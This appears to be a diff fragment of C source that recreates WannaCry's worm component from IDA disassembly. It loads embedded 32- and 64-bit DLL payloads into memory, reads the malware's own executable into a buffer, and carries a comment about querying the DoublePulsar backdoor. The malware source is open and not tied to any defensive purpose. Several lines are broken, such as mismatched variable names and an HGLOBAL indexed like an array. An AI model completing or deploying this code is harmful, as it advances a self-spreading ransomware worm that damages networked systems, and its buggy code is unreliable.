@@ -370,11 +370,14 @@ unsigned char x64_dll[] = "\MZ THIS FILE CANNOT BE RAN IN DOS MODE";
 
 //init the DLL building in memory here
 //EXE file global here
-HGLOBAL ThisExecutableInADLL_x86;
-HGLOBAL ThisExecutableInADLL_x64;
+HGLOBAL DLLPayload32;
+HGLOBAL DLLPayload64;
+HGLOBAL ThisExe;
 
 //Location of our Exe to read
 unsigned char Filename[MAX_PATH];
+DWORD fileSize; 
+DWORD NumberOfBytesRead;
 
 //init the DLL payload here
 //read from Wannacry in IDA
@@ -385,25 +388,33 @@ HGLOBAL initialize_payload()
 	32-bit dll start address 0x40B020, size is 0x4060 bytes
 	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
 	*/
-	DWORD NumberOfBytesRead;
-	DWORD fileSize;
 	//size = 0x4060 converted to decimal: 16480
-	ThisExecutableInADLL_x86 = GlobalAlloc(GPTR, 5298176); 
+	DLLPayload32 = GlobalAlloc(GPTR, 5298176);  /* 0x50D000 found in IDA */
+	if(DLLPayload32 == NULL)
+	{
+		return NULL;
+	}
 	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
-	
+	memcpy(DLLPayload32, x86_dll, 16480);
 	//size = 0xc8a4 converted to decimal: 51364
-	ThisExecutableInADLL_x64 = GlobalAlloc(GPTR, 5298176); //0x50D000 found in IDA
+	DLLPayload64 = GlobalAlloc(GPTR, 5298176); //0x50D000 found in IDA
+	if(DllPayload64 == NULL)
+	{
+		GlobalFree(DLLPayload32);
+		return NULL;
+	}
+	memcpy(DLLPayload64, x64_dll, 51364);
 	
 	//if no errors continue, otherwise close and abort()
-	if(hDLL_x86 || hDLL_x64)
+	if( DLLPayload32 ||  DLLPayload64)
 	{
 		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
-		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
+		HANDLE fileHandle = CreateFileA(Filename, GENERIC_READ, 1, NULL, 3, 4, NULL);
 		if(fileHandle != INVALID_FILE_HANDLE)
 		{
 			fileSize = GetFileSize(fileHandle, NULL);
-			EXE_BUFFER[0] = fileSize; //Dword length written here
-			ReadFile(fileHandle, EXE_BUFFER+4, &fileSize, &NumberOfBytesRead, 0);
+			ThisExe[0] = fileSize; //Dword length written here
+			ReadFile(fileHandle, ThisExe+4, &fileSize, &NumberOfBytesRead, 0);
     			CloseHandle(fileHandle);
 		}
 	}
@@ -421,8 +432,6 @@ int main()
 	
 	//initialize DLL payload in memory
 	initialize_payload();
-	
-	
 	
 	//etc etc
 	//Send Packets to get DoublePulsar Information
